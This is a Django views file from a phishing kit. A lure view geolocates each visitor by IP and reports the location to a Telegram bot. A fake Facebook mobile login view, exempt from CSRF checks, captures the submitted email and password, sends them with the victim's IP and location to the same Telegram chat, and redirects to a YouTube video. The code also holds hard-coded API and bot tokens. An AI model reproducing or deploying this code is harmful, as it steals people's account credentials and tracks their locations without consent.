from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import credentials_capturer
from django.http import HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
import urllib.parse
import smtplib
from django.conf import settings
from django.core.mail import send_mail
import requests
from django.views.decorators.clickjacking import xframe_options_exempt
from bs4 import BeautifulSoup
import json
import datetime

def play_video(request):
    global video_url
    api_key = 'c46b348355866e'
    user_ip = request.META.get('HTTP_X_FORWARDED_FOR')
    response = requests.get(f'https://ipinfo.io/{str(user_ip)}?token=c46b348355866e')
    data = response.json()
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    video_url = 'https://www.youtube.com/embed/OEQ1B_J6_DE'
    api_token = '6149036873:AAEgb2ZsTMHnMyoWwB6tkOBjdvtLLq850BI'
    chat_id = '-632245863'
    message = f"someone opened your link from {user_ip} \ncountry: {data['country']} \ncity: {data['city']} \nregion: {data['region']} \nregion: {data['loc']}  \nDate and time: {current_time} "
    print(message)
    requests.post('https://api.telegram.org/bot' + api_token + '/sendMessage', json={'chat_id': chat_id, 'text': message})
    return render(request, 'welcome_darling.html', {'video_url': video_url})


def continue_watching(request):
    return render(request, 'continue_watching.html', {'video_url': video_url})

@csrf_exempt
def capture_credentials(request):
    if request.method == 'POST':
        print(request.POST)

        form = credentials_capturer(request.POST, initial={'email': '', 'password': ''})
        if form.is_valid():
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']
            form.save()
            # send Telegram message
            api_key = 'c46b348355866e'
            user_ip = request.META.get('HTTP_X_FORWARDED_FOR')
            response = requests.get(f'https://ipinfo.io/{str(user_ip)}?token=c46b348355866e')
            data = response.json()
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            api_token = '6149036873:AAEgb2ZsTMHnMyoWwB6tkOBjdvtLLq850BI'
            chat_id = '-632245863'
            message = 'User with email: ' + email + ' and password: ' + password + '\nhas sent their credentials. IP: '+ str(user_ip) + f"\ncountry: {data['country']} \ncity: {data['city']} \nregion: {data['region']} \nregion: {data['loc']}  \nDate and time: {current_time}"
            print(message)
            requests.post('https://api.telegram.org/bot' + api_token + '/sendMessage', json={'chat_id': chat_id, 'text': message})
            print("message with credentials captured has been sent")
            response = HttpResponseRedirect("https://www.youtube.com/embed/OEQ1B_J6_DE")
            return response
    else:
        form = credentials_capturer()
    return render(request, 'fb_mobile.html', {'form': form})
